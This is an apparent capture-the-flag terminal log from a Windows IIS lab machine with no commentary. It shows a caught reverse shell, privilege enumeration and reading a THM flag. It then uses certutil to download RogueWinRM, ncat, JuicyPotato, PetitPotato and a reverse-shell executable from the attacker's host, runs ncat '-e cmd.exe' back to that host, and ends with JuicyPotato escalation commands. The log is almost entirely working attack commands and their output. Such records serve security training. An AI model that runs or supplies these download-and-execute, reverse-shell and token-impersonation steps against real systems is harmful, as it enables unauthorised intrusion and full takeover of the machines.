
```sh
┌──(kali㉿kali)-[~/shells]
└─$ nc -lvnp 443                                    
listening on [any] 443 ...

connect to [10.18.21.236] from (UNKNOWN) [10.10.121.172] 49836
Spawn Shell...
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
iis apppool\defaultapppool

c:\windows\system32\inetsrv>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is AC3C-5CB5

 Directory of c:\windows\system32\inetsrv

07/25/2024  09:01 AM    <DIR>          .
07/25/2024  09:01 AM    <DIR>          ..
07/25/2020  08:05 AM           235,008 abocomp.dll
07/25/2020  08:05 AM           323,584 adsiis.dll
07/25/2020  08:05 AM           119,808 appcmd.exe
07/16/2016  06:20 AM             3,810 appcmd.xml
07/25/2020  08:05 AM           184,320 AppHostNavigators.dll
07/25/2020  08:05 AM            64,512 apphostsvc.dll
07/25/2020  08:05 AM           405,504 appobj.dll
07/25/2020  08:05 AM           501,248 asp.dll
07/25/2020  08:05 AM            22,196 asp.mof
07/25/2020  08:05 AM           129,536 aspnetca.exe
07/25/2020  08:05 AM            23,040 asptlb.tlb
07/25/2020  08:05 AM            40,960 authanon.dll
07/25/2020  08:05 AM            37,888 authbas.dll
07/25/2020  08:05 AM            53,248 authsspi.dll
07/25/2020  08:05 AM            75,776 browscap.dll
07/25/2020  08:05 AM            34,474 browscap.ini
07/25/2020  08:05 AM            25,088 cachfile.dll
07/25/2020  08:05 AM            50,688 cachhttp.dll
07/25/2020  08:05 AM            14,848 cachtokn.dll
07/25/2020  08:05 AM            14,336 cachuri.dll
07/25/2020  08:05 AM           102,912 Cnfgprts.ocx
07/25/2020  08:05 AM            87,040 coadmin.dll
07/25/2020  08:05 AM    <DIR>          config
07/25/2020  08:05 AM            20,480 defdoc.dll
07/25/2020  08:05 AM            39,424 diprestr.dll
07/25/2020  08:05 AM    <DIR>          en
07/25/2020  08:05 AM    <DIR>          en-US
07/25/2020  08:05 AM            68,096 filter.dll
07/25/2024  09:01 AM    <DIR>          History
07/25/2020  08:05 AM            22,016 httpmib.dll
07/25/2020  08:05 AM            17,920 hwebcore.dll
07/25/2020  08:05 AM            63,105 iis.msc
07/25/2020  08:05 AM            48,997 iis6.msc
07/25/2020  08:05 AM            26,624 iisadmin.dll
07/25/2020  08:05 AM         1,011,712 iiscfg.dll
07/25/2020  08:05 AM           322,048 iiscore.dll
07/25/2020  08:05 AM           101,888 iisetw.dll
07/25/2020  08:05 AM           104,960 iisext.dll
07/25/2020  08:05 AM           167,936 iisfreb.dll
07/25/2020  08:05 AM           109,568 iisreg.dll
07/25/2020  08:05 AM           230,912 iisres.dll
07/25/2020  08:05 AM            37,888 iisrstas.exe
07/25/2020  08:05 AM           190,464 iissetup.exe
07/25/2020  08:05 AM            72,192 iissyspr.dll
07/25/2020  08:05 AM            14,336 iisual.exe
07/25/2020  08:05 AM           265,728 iisui.dll
07/25/2020  08:05 AM            81,408 IISUiObj.dll
07/25/2020  08:05 AM           290,816 iisutil.dll
07/25/2020  08:05 AM           568,832 iisw3adm.dll
07/25/2020  08:05 AM            48,128 iiswsock.dll
07/25/2020  08:05 AM            17,408 inetinfo.exe
07/25/2020  08:05 AM           985,600 inetmgr.dll
07/25/2020  08:05 AM           125,440 InetMgr.exe
07/25/2020  08:05 AM            25,088 InetMgr6.exe
07/25/2020  08:05 AM           256,512 infocomm.dll
07/25/2020  08:05 AM            29,696 iprestr.dll
07/25/2020  08:05 AM           122,368 isapi.dll
07/25/2020  08:05 AM            67,072 isatq.dll
07/25/2020  08:05 AM            25,088 iscomlog.dll
07/25/2020  08:05 AM            38,400 loghttp.dll
07/25/2020  08:05 AM            90,624 logui.ocx
07/25/2020  08:05 AM           685,464 MBSchema.bin.00000000h
07/25/2020  08:05 AM           266,906 MBSchema.xml
07/25/2020  08:05 AM    <DIR>          MetaBack
07/25/2024  09:01 AM            10,152 MetaBase.xml
07/25/2020  08:05 AM           299,520 metadata.dll
07/25/2020  08:05 AM           143,360 Microsoft.Web.Administration.dll
07/25/2020  08:05 AM         1,052,672 Microsoft.Web.Management.dll
07/25/2020  08:05 AM            41,984 modrqflt.dll
07/25/2020  08:05 AM           492,544 nativerd.dll
07/25/2020  08:05 AM            21,504 protsup.dll
07/25/2020  08:05 AM            10,240 rpcref.dll
07/25/2020  08:05 AM            33,792 rsca.dll
07/25/2020  08:05 AM            51,200 rscaext.dll
07/25/2020  08:05 AM            44,032 static.dll
07/25/2020  08:05 AM            18,944 svcext.dll
07/25/2020  08:05 AM           193,024 uihelper.dll
07/25/2020  08:05 AM            23,552 urlauthz.dll
07/25/2020  08:05 AM            19,968 validcfg.dll
07/25/2020  08:05 AM           145,480 w3core.mof
07/25/2020  08:05 AM            15,872 w3ctrlps.dll
07/25/2020  08:05 AM            30,208 w3ctrs.dll
07/25/2020  08:05 AM           110,592 w3dt.dll
07/25/2020  08:05 AM             2,560 w3isapi.mof
07/25/2020  08:05 AM            83,456 w3logsvc.dll
07/25/2020  08:05 AM            29,696 w3tp.dll
07/25/2020  08:05 AM            24,576 w3wp.exe
07/25/2020  08:05 AM            72,192 w3wphost.dll
07/25/2020  08:05 AM            39,936 wamreg.dll
07/25/2020  08:05 AM            31,744 wbhstipm.dll
07/25/2020  08:05 AM            27,648 wbhst_pm.dll
07/25/2020  08:05 AM           480,072 WebAdministration.mof
07/25/2020  08:05 AM           387,584 wmi-appserver.dll
07/25/2020  08:05 AM            12,288 WMSvc.exe
07/16/2016  06:19 AM               165 wmsvc.exe.config
07/25/2020  08:05 AM           172,032 XPath.dll
              91 File(s)     13,333,557 bytes
               7 Dir(s)  21,004,009,472 bytes free

c:\windows\system32\inetsrv>set
set
ALLUSERSPROFILE=C:\ProgramData
APPDATA=C:\Windows\system32\config\systemprofile\AppData\Roaming
APP_POOL_CONFIG=C:\inetpub\temp\apppools\DefaultAppPool\DefaultAppPool.config
APP_POOL_ID=DefaultAppPool
CommonProgramFiles=C:\Program Files\Common Files
CommonProgramFiles(x86)=C:\Program Files (x86)\Common Files
CommonProgramW6432=C:\Program Files\Common Files
COMPUTERNAME=RELEVANT
ComSpec=C:\Windows\system32\cmd.exe
LOCALAPPDATA=C:\Windows\system32\config\systemprofile\AppData\Local
NUMBER_OF_PROCESSORS=1
OS=Windows_NT
Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\WindowsApps
PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
PROCESSOR_ARCHITECTURE=AMD64
PROCESSOR_IDENTIFIER=Intel64 Family 6 Model 79 Stepping 1, GenuineIntel
PROCESSOR_LEVEL=6
PROCESSOR_REVISION=4f01
ProgramData=C:\ProgramData
ProgramFiles=C:\Program Files
ProgramFiles(x86)=C:\Program Files (x86)
ProgramW6432=C:\Program Files
PROMPT=$P$G
PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
PUBLIC=C:\Users\Public
SystemDrive=C:
SystemRoot=C:\Windows
TEMP=C:\Windows\TEMP
TMP=C:\Windows\TEMP
USERDOMAIN=WORKGROUP
USERNAME=RELEVANT$
USERPROFILE=C:\Windows\system32\config\systemprofile
windir=C:\Windows

c:\windows\system32\inetsrv>type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
The system cannot find the path specified.

c:\windows\system32\inetsrv>cmdkey /list
cmdkey /list

Currently stored credentials:

* NONE *

c:\windows\system32\inetsrv>cd c:/users
cd c:/users

c:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is AC3C-5CB5

 Directory of c:\Users

07/25/2020  02:03 PM    <DIR>          .
07/25/2020  02:03 PM    <DIR>          ..
07/25/2020  08:05 AM    <DIR>          .NET v4.5
07/25/2020  08:05 AM    <DIR>          .NET v4.5 Classic
07/25/2020  10:30 AM    <DIR>          Administrator
07/25/2020  02:03 PM    <DIR>          Bob
07/25/2020  07:58 AM    <DIR>          Public
               0 File(s)              0 bytes
               7 Dir(s)  21,038,215,168 bytes free

c:\Users>cd bob
cd bob

c:\Users\Bob>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is AC3C-5CB5

 Directory of c:\Users\Bob

07/25/2020  02:03 PM    <DIR>          .
07/25/2020  02:03 PM    <DIR>          ..
07/25/2020  02:04 PM    <DIR>          Desktop
               0 File(s)              0 bytes
               3 Dir(s)  21,038,215,168 bytes free

c:\Users\Bob>cd desktop
cd desktop

c:\Users\Bob\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is AC3C-5CB5

 Directory of c:\Users\Bob\Desktop

07/25/2020  02:04 PM    <DIR>          .
07/25/2020  02:04 PM    <DIR>          ..
07/25/2020  08:24 AM                35 user.txt
               1 File(s)             35 bytes
               2 Dir(s)  21,038,215,168 bytes free

c:\Users\Bob\Desktop>type user.txt
type user.txt
THM{fdk4ka34vk346ksxfr21tg789ktf45}
c:\Users\Bob\Desktop>whoami /all
whoami /all

USER INFORMATION
----------------

User Name                  SID                                                          
========================== =============================================================
iis apppool\defaultapppool S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415


GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes                                        
==================================== ================ ============ ==================================================
Mandatory Label\High Mandatory Level Label            S-1-16-12288                                                   
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
BUILTIN\IIS_IUSRS                    Alias            S-1-5-32-568 Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
                                     Unknown SID type S-1-5-82-0   Mandatory group, Enabled by default, Enabled group


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled


c:\Users\Bob\Desktop>cd c:/windows/temp
cd c:/windows/temp

c:\Windows\Temp>certutil -urlcache -split -f "http://10.18.21.236:8000/exploits/RogueWinRM.exe
certutil -urlcache -split -f "http://10.18.21.236:8000/exploits/RogueWinRM.exe
****  Online  ****
CertUtil: -URLCache command FAILED: 0x80072ee4 (WinHttp: 12004 ERROR_WINHTTP_INTERNAL_ERROR)
CertUtil: An internal error occurred in the Microsoft Windows HTTP Services

c:\Windows\Temp>certutil -urlcache -split -f "http://10.18.21.236:8000/exploits/RogueWinRM.exe
certutil -urlcache -split -f "http://10.18.21.236:8000/exploits/RogueWinRM.exe
****  Online  ****
  0000  ...
  014f
CertUtil: -URLCache command FAILED: 0x80190194 (-2145844844 HTTP_E_STATUS_NOT_FOUND)
CertUtil: Not found (404).

c:\Windows\Temp>certutil -urlcache -split -f "http://10.18.21.236:8000/tools/RogueWinRM.exe
certutil -urlcache -split -f "http://10.18.21.236:8000/tools/RogueWinRM.exe
****  Online  ****
  000000  ...
  025e00
CertUtil: -URLCache command completed successfully.

c:\Windows\Temp>dir ro*
dir ro*
 Volume in drive C has no label.
 Volume Serial Number is AC3C-5CB5

 Directory of c:\Windows\Temp

07/25/2024  09:44 AM           155,136 RogueWinRM.exe
               1 File(s)        155,136 bytes
               0 Dir(s)  21,036,580,864 bytes free

c:\Windows\Temp>certutil -urlcache -split -f "http://10.18.21.236:8000/tools/ncat.exe
certutil -urlcache -split -f "http://10.18.21.236:8000/tools/ncat.exe
****  Online  ****
  000000  ...
  239800
CertUtil: -URLCache command completed successfully.

c:\Windows\Temp>C:\Windows\temp\RogueWinRM.exe -p "C:\windows\temp\ncat.exe" -a "-e cmd.exe 10.18.21.236 444"
C:\Windows\temp\RogueWinRM.exe -p "C:\windows\temp\ncat.exe" -a "-e cmd.exe 10.18.21.236 444"

Listening for connection on port 5985 .... 
Error: WinRM already running on port 5985. Unexploitable!
bind failed with error: 10013

c:\Windows\Temp>C:\Windows\temp\RogueWinRM.exe -p c:\windows\system32\cmd.exe                                    
C:\Windows\temp\RogueWinRM.exe -p c:\windows\system32\cmd.exe

Listening for connection on port 5985 .... 
Error: WinRM already running on port 5985. Unexploitable!
bind failed with error: 10013

c:\Windows\Temp>

```

`certutil -urlcache -split -f "http://10.18.21.236:8000/tools/JuicyPotato.exe`
`certutil -urlcache -split -f "http://10.18.21.236:8000/shells/revsh-444.exe`
`JuicyPotato.exe -t * -p revsh-444.exe -l 444`

`certutil -urlcache -split -f "http://10.18.21.236:8000/tools/PetitPotato.exe`
